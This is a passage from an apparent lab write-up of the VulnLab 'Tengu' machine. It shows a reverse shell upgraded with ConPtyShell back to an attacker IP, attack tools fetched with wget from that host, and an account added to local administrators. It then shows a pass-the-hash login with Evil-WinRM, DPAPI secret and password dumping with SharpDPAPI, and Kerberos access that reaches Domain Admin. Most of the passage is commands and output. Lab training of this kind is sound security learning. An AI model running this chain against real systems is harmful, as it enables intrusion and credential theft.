connect to [10.8.1.150] from (UNKNOWN) [10.10.184.198] 49845

ps> whoami
nt authority\system

ps> hostname
SQL
```

#### Upgrading to Full TTY with ConPtyShell

Downloading ConPtyShell:

```powershell
ps> cd C:\Users\Public

ps> wget http://10.8.1.150:8080/Invoke-ConPtyShell.ps1 -Outfile Invoke-ConPtyShell.ps1
```

Importing and executing:

```powershell
ps> . .\Invoke-ConPtyShell.ps1

ps> Invoke-ConPtyShell 10.8.1.150 3001
```

Starting listener:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ stty raw -echo; (stty size; cat) | nc -lvnp 3001
listening on [any] 3001 ...
connect to [10.8.1.150] from (UNKNOWN) [10.10.184.198] 49851

Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Public>whoami
nt authority\system

C:\Users\Public>hostname
SQL
```

**Success!** We now have a fully interactive TTY shell as NT AUTHORITY\SYSTEM.

### Extracting Domain Credentials with SharpDPAPI

#### Adding GMSA Account to Local Administrators

To facilitate remote access and credential extraction, we'll add the GMSA account to local administrators:

```powershell
C:\Users\Public>net localgroup administrators gMSA01$ /add
The command completed successfully.

C:\Users\Public>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
gMSA01$
TENGU\Domain Admins
The command completed successfully.
```

#### Connecting via Evil-WinRM

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ proxychains evil-winrm -u 'gMSA01$' -H 'd4b65861e85773fba2035b31ebcacb37' -i 10.10.184.198

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA01$\Documents> whoami
tengu\gmsa01$

*Evil-WinRM* PS C:\Users\gMSA01$\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
TENGU\SQL_ADMINS                           Group            S-1-5-21-... Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

#### Understanding SharpDPAPI

**SharpDPAPI** is a tool for extracting DPAPI (Data Protection API) protected data. DPAPI is used by Windows to encrypt:

* Saved credentials
* Browser passwords
* Certificates
* VPN passwords
* Other sensitive data

**Key Operations:**

* Extract master keys
* Decrypt DPAPI blobs
* Retrieve stored credentials
* Dump system secrets

#### Downloading SharpDPAPI

```powershell
*Evil-WinRM* PS C:\Users\gMSA01$\Documents> wget http://10.8.1.150:8080/Invoke-SharpDPAPI.ps1 -Outfile Invoke-SharpDPAPI.ps1

*Evil-WinRM* PS C:\Users\gMSA01$\Documents> ls


    Directory: C:\Users\gMSA01$\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/13/2024   4:15 PM         156789 Invoke-SharpDPAPI.ps1
```

#### Running Machine Triage

```powershell
*Evil-WinRM* PS C:\Users\gMSA01$\Documents> . .\Invoke-SharpDPAPI.ps1

*Evil-WinRM* PS C:\Users\gMSA01$\Documents> Invoke-SharpDPAPI machinetriage

  __                 _   _       _ ___
 (_  |_   _. ._ ._  | \ |_) /\  |_) |
 __) | | (_| |  |_) |_/ |  /--\ |  _|_
                |
  v1.12.0

[*] Action: Machine DPAPI Credential, Vault, and Certificate Triage

[*] Elevating to SYSTEM via token duplication for LSA secret retrieval
[*] RevertToSelf()

[*] Secret  : DPAPI_SYSTEM
[*]    full: C9C2333305555B68C729FD0938EE5DB5D2C8B33540B36F0AC59918C608686152CB7F09F74A22F544
[*]    m/u : C9C2333305555B68C729FD0938EE5DB5D2C8B335 / 40B36F0AC59918C608686152CB7F09F74A22F544

[*] SYSTEM master key cache:

{474602b3-bbd6-4a0e-9c1d-52aa0cb0a039}:BE80161FB9DADBFBF9620483D8BC4EF0BDB4B6F5
{7710e63f-a791-438b-8dfa-33f25aef47a8}:6466F58B69E7B437DBCC89D4CAEFEF7E84944CE7
{1415bc56-749a-4f03-8a8e-9fb9733359ab}:FBED03CA71C0CACACF43D8EB3F6D03ADB9C3198B
{236fb638-82cd-4a22-b9e7-6745744da5bd}:CD9A01A3056FC877EE9B343AC3BE584AB7DF4D86

[*] Triaging System Credentials

Folder       : C:\Windows\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

  CredFile           : 67B6C9FA0475C51A637428875C335AAD

    guidMasterKey    : {1415bc56-749a-4f03-8a8e-9fb9733359ab}
    size             : 576
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
    description      : Local Credential Data

    LastWritten      : 3/10/2024 2:49:34 PM
    TargetName       : Domain:batch=TaskScheduler:Task:{3C0BC8C6-D88D-450C-803D-6A412D858CF2}
    TargetAlias      :
    Comment          :
    UserName         : TENGU\T0_c.fowler
    Credential       : UntrimmedDisplaceModify25
```

:\*\*

* Username: `T0_c.fowler`
* Password: `UntrimmedDisplaceModify25`

#### Validating Credentials

Testing with NetExec:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ proxychains netexec smb 10.10.184.197 -u 'T0_c.fowler' -p 'UntrimmedDisplaceModify25'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
SMB         10.10.184.197   445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:tengu.vl) (signing:True) (SMBv1:False)
SMB         10.10.184.197   445    DC               [-] tengu.vl\T0_c.fowler:UntrimmedDisplaceModify25 STATUS_ACCOUNT_RESTRICTION
```

**Status:** `STATUS_ACCOUNT_RESTRICTION` - This indicates the account has logon restrictions, typically requiring Kerberos authentication.

### Accessing Domain Controller via Kerberos

#### Understanding STATUS\_ACCOUNT\_RESTRICTION

The `STATUS_ACCOUNT_RESTRICTION` error occurs when:

* Account has "This account is sensitive and cannot be delegated" flag
* Restricted logon hours
* Restricted workstations
* Kerberos-only authentication required

#### Configuring Kerberos

Creating proper Kerberos configuration:

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ sudo nano /etc/krb5.conf

[libdefaults]
    default_realm = TENGU.VL
    kdc_timesync = 1
    ccache_type = 4
    forwardable = true
    proxiable = true
    fcc-mit-ticketflags = true

[realms]
    TENGU.VL = {
        kdc = DC.TENGU.VL
        admin_server = DC.TENGU.VL
    }

[domain_realm]
    .tengu.vl = TENGU.VL
    tengu.vl = TENGU.VL
```

#### Obtaining Kerberos TGT

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ kinit T0_C.FOWLER
Password for T0_C.FOWLER@TENGU.VL: UntrimmedDisplaceModify25

┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ klist
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: T0_C.FOWLER@TENGU.VL

Valid starting       Expires              Service principal
08/13/2024 16:22:15  08/14/2024 02:22:15  krbtgt/TENGU.VL@TENGU.VL
	renew until 08/14/2024 16:22:15
```

**Success!** We obtained a Ticket Granting Ticket (TGT) for T0\_C.FOWLER.

#### Connecting to Domain Controller

```bash
┌──(sn0x㉿sn0x)-[~/VulnLab/Tengu]
└─$ proxychains evil-winrm -i dc.tengu.vl -r tengu.vl

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\T0_c.fowler\Documents> whoami
tengu\t0_c.fowler

*Evil-WinRM* PS C:\Users\T0_c.fowler\Documents> hostname
DC

*Evil-WinRM* PS C:\Users\T0_c.fowler\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
TENGU\Domain Admins                        Group            S-1-5-21-3916510870-3362933833-299993410-512 Mandatory group, Enabled by default, Enabled group
TENGU\Denied RODC Password Replication Grp Group            S-1-5-21-3916510870-3362933833-299993410-572 Mandatory group, Enabled by default, Enabled group, Local Group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```

**DOMAIN ADMIN ACHIEVED!**

The user `T0_c.fowler` is a member of the `Domain Admins` group, granting full control over the domain.

#### Verifying Domain Admin Access

```powershell
*Evil-WinRM* PS C:\Users\T0_c.fowler\Documents> net user T0_c.fowler /domain
User name                    T0_c.fowler
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/9/2024 8:04:33 AM
Password expires             Never
Password changeable          3/10/2024 8:04:33 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   8/13/2024 4:22:15 PM

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Domain Admins        
The command completed successfully.
```

#### Accessing Administrator Desktop

```powershell
*Evil-WinRM* PS C:\Users\T0_c.fowler\Documents> cd C:\Users\Administrator\Desktop

*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/9/2024   2:53 PM             35 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
VL{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
```

**Final Status:** Domain Admin on `tengu.vl` domain achieved via user `T0_c.fowler`
